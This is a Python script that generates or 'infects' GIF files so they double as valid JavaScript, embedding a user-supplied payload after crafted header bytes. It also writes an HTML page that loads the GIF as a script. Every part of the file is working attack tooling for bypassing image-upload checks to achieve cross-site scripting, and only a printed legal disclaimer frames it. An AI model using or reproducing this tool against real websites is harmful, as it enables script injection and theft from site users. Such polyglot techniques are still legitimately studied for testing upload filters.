#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import binascii

def _hexify(num):
    """
    Converts and formats to hexadecimal (returns bytes)
    """
    num = "%x" % num
    if len(num) % 2:
        num = '0' + num
    return binascii.unhexlify(num)  # Python 3 用 binascii 处理十六进制转 bytes

def _generate_and_write_to_file(payload, fname):
    """
    Generates a fake but valid GIF with scripting
    """
    with open(fname + "_malw.gif", "wb") as f:
        header = (b'\x47\x49\x46\x38\x39\x61'  # GIF89a
                  b'\x2F\x2A'
                  b'\x0A\x00'
                  b'\x00'
                  b'\xFF'
                  b'\x00'
                  b'\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B'
                  b'\x2A\x2F'
                  b'\x3D\x31\x3B')
        trailer = b'\x3B'

        f.write(header)
        if isinstance(payload, str):
            payload = payload.encode('utf-8')
        f.write(payload)
        f.write(trailer)
    return True

def _generate_launching_page(fname):
    """
    Creates the HTML launching page
    """
    htmlpage = f"""<html>
<head><title>Opening an image</title></head>
<body>
    <img src="{fname}_malw.gif">
    <script src="{fname}_malw.gif"></script>
</body>
</html>
"""
    with open("run.html", "w", encoding="utf-8") as html:
        html.write(htmlpage)
    return True

def _inject_into_file(payload, fname):
    """
    Injects the payload into existing GIF
    """
    newfile = fname + "_malw.gif"
    with open(newfile, "wb") as fout:
        with open(fname, "rb") as fin:
            for line in fin:
                ls1 = line.replace(b'\x2A\x2F', b'\x00\x00')
                ls2 = ls1.replace(b'\x2F\x2A', b'\x00\x00')
                fout.write(ls2)
        fout.seek(6)
        fout.write(b'\x2F\x2A')  # /*

    with open(newfile, "ab") as f:
        f.write(b'\x2A\x2F\x3D\x31\x3B')  # */=1;
        if isinstance(payload, str):
            payload = payload.encode('utf-8')
        f.write(payload)
        f.write(b'\x3B')
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("filename", help="The gif file name to be generated or infected")
    parser.add_argument("js_payload", help='The JavaScript payload, e.g., \'alert("XSS");\'')
    parser.add_argument("-i", "--inject-to-existing-gif", action="store_true", help="Inject into an existing gif")
    args = parser.parse_args()

    print("""
|======================================================================================================|
| [!] Legal disclaimer: usage of this tool for injecting malware to be propagated is illegal.         |
| It is the end user's responsibility to obey all applicable local, state and federal laws.           |
| Authors assume no liability and are not responsible for any misuse or damage caused by this program |
|======================================================================================================|
""")

    if args.inject_to_existing_gif:
        _inject_into_file(args.js_payload, args.filename)
    else:
        _generate_and_write_to_file(args.js_payload, args.filename)

    _generate_launching_page(args.filename)
    print("[+] Finished!")
